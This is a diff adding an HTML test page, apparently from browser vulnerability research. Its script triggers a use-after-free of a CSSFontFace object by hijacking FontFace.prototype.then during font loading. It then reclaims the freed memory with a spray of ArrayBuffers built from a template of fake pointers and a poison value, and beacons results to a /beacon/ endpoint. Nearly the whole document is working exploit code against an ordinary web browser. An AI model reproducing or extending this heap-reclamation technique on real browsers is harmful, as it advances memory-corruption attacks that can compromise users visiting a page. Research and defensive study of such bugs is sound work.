@@ -1,0 +1,70 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf9</title>
+<script>
+/* Reclaim the freed CSSFontFace chunk and put a TEMPLATE back into it instead of
+   zeros, so the engine's continuation on the dangling pointer sees the same field
+   layout the object had when we read it in uaf6:
+     +0x00 = 1 (refcount/flags)
+     +0x58 = 0x00000010008d8920
+     +0x68 = 0x00000010007e7060
+   Everything else zero. A deviation from the template at scan time is the engine
+   writing into a chunk we own. */
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var SIZE = 192, K = 16, styleEl = null, firedHere = false, done = false;
+var TPL = new Uint8Array(SIZE);
+TPL[0] = 1;
+var POISON_OFF = parseInt(location.search.replace(/.*p=(\d+).*/, '$1') || '104', 10);
+function put64(v, off){ for (var i = 0; i < 8; i++) TPL[off + i] = Math.floor(v / Math.pow(256, i)) & 0xff; }
+put64(0x4141414141414141, POISON_OFF);
+function hex(v){ return ('0' + v.toString(16)).slice(-2); }
+function setup(){
+  var A = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = [A];
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U12-SETUP');
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      window.__map = [];
+      for (var k = 0; k < K; k++) {
+        var ab = new ArrayBuffer(SIZE);
+        var v = new Uint8Array(ab);
+        v.set(TPL);
+        window.__map.push(v);
+      }
+      return undefined;
+    },
+    set: function(){}
+  });
+  b('U12-LOAD-CALLED');
+  document.fonts.load('1em f0, s0', 'AB').then(function(){ b('U12-RESOLVED'); }, function(){ b('U12-REJECTED'); });
+  setTimeout(scan, 60);
+  setTimeout(scan, 400);
+  setTimeout(function(){ if (!done) b('U12-NOSCAN-fired-' + (firedHere ? 1 : 0)); }, 1500);
+}
+function scan(){
+  if (done) return;
+  var m = window.__map; if (!m || !m.length) return;
+  done = true;
+  var out = [];
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i], diffs = [], n = 0;
+    for (var j = 0; j < v.length; j++) if (v[j] !== TPL[j]) { n++; if (diffs.length < 32) diffs.push(j + ':' + hex(v[j])); }
+    if (n) out.push('b' + i + '-n' + n + '-' + diffs.join(','));
+  }
+  if (!out.length) { b('U12-ALL-TEMPLATE-' + m.length); return; }
+  b('U12-DEV-' + out.join('_'));
+}
+function run(){ setup(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>uaf9</p></body></html>
